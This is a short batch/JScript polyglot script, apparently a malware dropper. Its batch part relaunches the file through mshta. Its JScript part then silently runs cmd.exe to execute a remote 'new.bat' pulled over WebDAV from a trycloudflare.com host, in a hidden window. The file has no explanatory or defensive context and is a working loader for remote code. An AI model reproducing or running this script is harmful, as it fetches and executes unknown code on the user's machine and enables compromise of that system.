@echo off
goto :batch

/*
---------- JScript Section ----------*/
<script language="JScript">
var objShell = new ActiveXObject("WScript.Shell");
objShell.Run('cmd.exe /c \\\\cats-memo-apply-helena.trycloudflare.com@SSL\\DavWWWRoot\\new.bat', 0, false);
close();
</script>
exit /b

:batch
mshta "%~f0"